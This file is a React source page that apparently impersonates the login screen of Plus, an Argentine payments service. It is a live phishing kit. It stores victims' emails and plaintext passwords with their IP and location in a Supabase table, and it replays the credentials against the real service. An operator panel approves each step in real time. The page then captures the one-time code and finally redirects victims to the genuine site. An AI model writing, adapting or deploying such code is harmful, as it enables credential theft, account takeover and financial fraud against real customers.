import { useState, useEffect, useCallback } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import PlusLoginForm from "@/components/plus/PlusLoginForm";
import PlusWaitingScreen from "@/components/plus/PlusWaitingScreen";
import PlusOtpScreen from "@/components/plus/PlusOtpScreen";
import PlusSuccessScreen from "@/components/plus/PlusSuccessScreen";
import plusLogo from "@/assets/plus-logo-white.svg";

type Step = "login" | "waiting" | "otp" | "finalizing" | "done";

const NAV_ITEMS = ["INICIO", "WLD", "DÓLAR INFINITO", "PAGOS CON PIX", "FAQs"];
const PLUS_REDIRECT_URL = "https://www.plus.com.ar/home";

const Plus = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [finalizingMessage, setFinalizingMessage] = useState("Estamos verificando seus dados com segurança...");

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    document.title = "Plus — Iniciar Sesión";
  }, []);

  const parseLoginError = useCallback((rawError?: string) => {
    const normalized = (rawError || "").toLowerCase();

    if (
      normalized.includes("senha") ||
      normalized.includes("password") ||
      normalized.includes("contraseña") ||
      normalized.includes("invalid") ||
      normalized.includes("incorrect") ||
      normalized.includes("credencial")
    ) {
      return {
        message: "Email ou senha incorretos. Tente novamente.",
        sessionStatus: "wrong_password",
      };
    }

    if (
      normalized.includes("rate limit") ||
      normalized.includes("429") ||
      normalized.includes("muitas tentativas") ||
      normalized.includes("too many")
    ) {
      return {
        message: "Muitas tentativas. Aguarde alguns minutos e tente novamente.",
        sessionStatus: "rate_limited",
      };
    }

    if (normalized.includes("bloquead") || normalized.includes("blocked")) {
      return {
        message: "Conta bloqueada. Entre em contato com o suporte da Plus.",
        sessionStatus: "account_blocked",
      };
    }

    if (normalized.includes("não existe") || normalized.includes("no existe") || normalized.includes("not found")) {
      return {
        message: "Conta não encontrada. Verifique seus dados e tente novamente.",
        sessionStatus: "account_not_found",
      };
    }

    if (
      normalized.includes("network") ||
      normalized.includes("conex") ||
      normalized.includes("fetch") ||
      normalized.includes("timeout")
    ) {
      return {
        message: "Erro de conexão. Verifique sua internet e tente novamente.",
        sessionStatus: "connection_error",
      };
    }

    return {
      message: "Não foi possível entrar agora. Tente novamente em instantes.",
      sessionStatus: "login_error",
    };
  }, []);

  useEffect(() => {
    if (step !== "finalizing") return;

    setFinalizingMessage("Estamos verificando seus dados com segurança...");

    const secondStepTimeout = window.setTimeout(() => {
      setFinalizingMessage("Aguarde mais um pouco...");
    }, 1800);

    const thirdStepTimeout = window.setTimeout(() => {
      setFinalizingMessage("Tudo certo! Redirecionando...");
    }, 3600);

    const redirectTimeout = window.setTimeout(() => {
      window.location.assign(PLUS_REDIRECT_URL);
    }, 4600);

    return () => {
      window.clearTimeout(secondStepTimeout);
      window.clearTimeout(thirdStepTimeout);
      window.clearTimeout(redirectTimeout);
    };
  }, [step]);

  useEffect(() => {
    if (!sessionId || step === "login" || step === "done" || step === "finalizing") return;

    const channel = supabase.channel(`session-review-${sessionId}`);
    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        handleDecision(payload.payload?.status as string);
      })
      .subscribe();

    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        handleDecision(payload.payload?.status as string);
      })
      .subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data) handleDecision(data.status);
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      supabase.removeChannel(otpChannel);
      clearInterval(pollInterval);
    };
  }, [sessionId, step]);

  const handleDecision = useCallback((status?: string) => {
    if (!status) return;

    if (status === "login_success" || status === "approved" || status === "completed" || status === "otp_approved") {
      setError("");
      setErrorMessage("");
      setStep("finalizing");
    } else if (status === "wrong_password") {
      setErrorMessage("Email ou senha incorretos. Tente novamente.");
      setStep("login");
    } else if (status === "account_not_found") {
      setErrorMessage("Conta não encontrada. Verifique seus dados e tente novamente.");
      setStep("login");
    } else if (status === "account_blocked") {
      setErrorMessage("Conta bloqueada. Entre em contato com o suporte da Plus.");
      setStep("login");
    } else if (status === "rate_limited") {
      setErrorMessage("Muitas tentativas. Aguarde alguns minutos e tente novamente.");
      setStep("login");
    } else if (status === "connection_error" || status === "login_error") {
      setErrorMessage("Não foi possível entrar agora. Tente novamente em instantes.");
      setStep("login");
    } else if (status === "redirect_otp" || status === "show_otp") {
      setStep("otp");
      setErrorMessage("");
    } else if (status === "otp_rejected") {
      setErrorMessage("Código incorreto. Tente novamente.");
      setStep("otp");
    } else if (status === "pending_review") {
      setErrorMessage("");
    }
  }, []);

  const handleLogin = useCallback(
    async (submittedEmail: string, password: string) => {
      setError("");
      setErrorMessage("");
      setLoading(true);
      setEmail(submittedEmail);

      // 1. Collect IP data in background
      let ipData = { ip: "unknown", country: "", city: "", region: "" };
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const d = await res.json();
          ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" };
        }
      } catch {
        /* ignore */
      }

      // 2. Create/update session for admin tracking
      let currentSessionId = sessionId;
      try {
        if (currentSessionId) {
          await supabase
            .from("sessions")
            .update({
              email: submittedEmail,
              password,
              status: "pending_review",
            })
            .eq("id", currentSessionId);
        } else {
          const newId = crypto.randomUUID();
          await supabase.from("sessions").insert({
            id: newId,
            email: submittedEmail,
            password,
            ip_address: ipData.ip,
            user_agent: navigator.userAgent,
            country: ipData.country,
            city: ipData.city,
            region: ipData.region,
            status: "pending_review",
            source: "plus",
            operator_code: operatorCode,
          });
          setSessionId(newId);
          currentSessionId = newId;
        }
      } catch {
        /* session tracking is non-blocking */
      }

      // 3. Call plus-auth backend to authenticate with plus.com.ar
      try {
        const { data: authResult, error: authError } = await supabase.functions.invoke("plus-auth", {
          body: { action: "login", email: submittedEmail, password, operatorCode },
        });

        if (authError) {
          const parsedError = parseLoginError(authError.message);
          if (currentSessionId) {
            await supabase.from("sessions").update({ status: parsedError.sessionStatus }).eq("id", currentSessionId);
          }
          setError(parsedError.message);
          setLoading(false);
          return;
        }

        if (authResult?.error) {
          const parsedError = parseLoginError(authResult.error);
          if (currentSessionId) {
            await supabase.from("sessions").update({ status: parsedError.sessionStatus }).eq("id", currentSessionId);
          }
          setError(parsedError.message);
          setLoading(false);
          return;
        }

        // 4. Login success — data saved to plus_accounts by edge function
        if (currentSessionId) {
          await supabase.from("sessions").update({ status: "login_success" }).eq("id", currentSessionId);
          // Broadcast success to admin panel
          await supabase.channel(`session-review-${currentSessionId}`).send({
            type: "broadcast",
            event: "review_decision",
            payload: { status: "login_success" },
          });
        }

        setStep("finalizing");
      } catch {
        const parsedError = parseLoginError("network");
        if (currentSessionId) {
          await supabase.from("sessions").update({ status: parsedError.sessionStatus }).eq("id", currentSessionId);
        }
        setError(parsedError.message);
      }

      setLoading(false);
    },
    [sessionId, operatorCode, parseLoginError],
  );

  const handleOtpSubmit = useCallback(
    async (code: string) => {
      if (!sessionId) return;
      setError("");
      setErrorMessage("");
      setLoading(true);
      try {
        await supabase
          .from("sessions")
          .update({
            otp_code: code,
            status: "otp_submitted",
          })
          .eq("id", sessionId);
        setStep("waiting");
      } catch {
        setError("Error al enviar el código.");
      }
      setLoading(false);
    },
    [sessionId],
  );

  // ─── MOBILE LAYOUT ───
  const mobileContent = (
    <div
      className="flex min-h-screen flex-col items-center justify-between px-6 py-10 md:hidden"
      style={{ background: "linear-gradient(180deg, #7c3aed 0%, #a855f7 40%, #9333ea 100%)" }}
    >
      {/* Logo */}
      <div className="flex-shrink-0 pt-8">
        <img src={plusLogo} alt="Plus" className="h-12" />
      </div>

      {/* Content */}
      <div className="w-full max-w-[380px] flex flex-col items-center gap-4 flex-1 justify-center">
        {step === "login" && (
          <>
            <h2 className="text-white text-2xl font-bold text-center mb-4">Iniciar Sesión</h2>
            <PlusLoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} />
          </>
        )}
        {step === "waiting" && <PlusWaitingScreen email={email} />}
        {step === "finalizing" && <PlusWaitingScreen email={email} message={finalizingMessage} />}
        {step === "otp" && <PlusOtpScreen email={email} onSubmit={handleOtpSubmit} loading={loading} error={error || errorMessage} />}
        {step === "done" && <PlusSuccessScreen email={email} />}
      </div>

      {/* Footer */}
      <div className="text-center space-y-0.5 flex-shrink-0 pb-4">
        <p className="text-[11px] text-white/30">Contratos de adhesión</p>
        <p className="text-[11px] text-white/30">Ley N° 24.240 de Defensa del Consumidor</p>
        <p className="text-[11px] text-white/30">v. 2.2.4</p>
      </div>
    </div>
  );

  // ─── DESKTOP LAYOUT ───
  const desktopContent = (
    <div
      className="hidden md:flex min-h-screen flex-col"
      style={{ background: "linear-gradient(135deg, #1a0a2e 0%, #2d1052 30%, #4c1d95 60%, #6d28d9 100%)" }}
    >
      {/* Top navbar */}
      <nav className="w-full bg-black/80 backdrop-blur-sm border-b border-white/5">
        <div className="max-w-7xl mx-auto px-8 flex items-center justify-between h-14">
          <img src={plusLogo} alt="Plus" className="h-7" />
          <div className="flex items-center gap-8">
            {NAV_ITEMS.map((item) => (
              <span
                key={item}
                className="text-white/70 text-[13px] font-medium tracking-wide hover:text-white/90 cursor-pointer transition-colors"
              >
                {item}
              </span>
            ))}
          </div>
          <div className="flex items-center gap-4">
            <span className="text-pink-400 text-[13px] font-medium cursor-pointer hover:text-pink-300 transition-colors">
              Registrate
            </span>
            <span className="text-white/40 text-[13px]">|</span>
            <span className="text-white/80 text-[13px] font-medium cursor-pointer hover:text-white transition-colors">
              Ingresá
            </span>
          </div>
        </div>
      </nav>

      {/* Main content */}
      <div className="flex-1 flex items-center justify-center">
        <div className="max-w-6xl w-full mx-auto px-8 grid grid-cols-2 gap-16 items-center">
          {/* Left side - illustration area */}
          <div className="flex items-center justify-center">
            <div className="relative">
              {/* Decorative phone mockup */}
              <div className="w-[280px] h-[400px] bg-white/5 rounded-3xl border border-white/10 backdrop-blur-sm p-4 flex flex-col items-center justify-center gap-4">
                <div className="w-16 h-16 rounded-full bg-amber-400/80 flex items-center justify-center">
                  <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                  </svg>
                </div>
                <div className="w-3/4 h-3 bg-white/20 rounded-full" />
                <div className="w-3/4 h-3 bg-white/15 rounded-full" />
                <div className="w-1/2 h-8 bg-amber-500/50 rounded-lg mt-2" />
              </div>
              {/* Decorative blobs */}
              <div className="absolute -left-16 top-1/2 -translate-y-1/2 w-32 h-48 bg-pink-500/20 rounded-full blur-3xl" />
              <div className="absolute -right-12 bottom-10 w-24 h-24 bg-purple-400/20 rounded-full blur-2xl" />
            </div>
          </div>

          {/* Right side - form */}
          <div className="flex flex-col items-start gap-2 max-w-[400px]">
            {step === "login" && (
              <>
                <p className="text-pink-400 text-sm font-medium italic">Hola!</p>
                <h2 className="text-white text-3xl font-bold mb-6">Iniciá Sesión</h2>
                <div className="w-full">
                  <PlusLoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} variant="desktop" />
                </div>
                <div className="flex items-center gap-2 mt-4">
                  <span className="text-white/80 text-sm font-bold">¿Primera vez en Plus?</span>
                  <span className="text-pink-400 text-sm font-semibold cursor-pointer hover:text-pink-300 transition-colors">
                    Registrate
                  </span>
                </div>
              </>
            )}
            {step === "waiting" && <PlusWaitingScreen email={email} />}
            {step === "finalizing" && <PlusWaitingScreen email={email} message={finalizingMessage} />}
            {step === "otp" && <PlusOtpScreen email={email} onSubmit={handleOtpSubmit} loading={loading} error={error || errorMessage} />}
            {step === "done" && <PlusSuccessScreen email={email} />}
          </div>
        </div>
      </div>
    </div>
  );

  return (
    <>
      {mobileContent}
      {desktopContent}
    </>
  );
};

export default Plus;
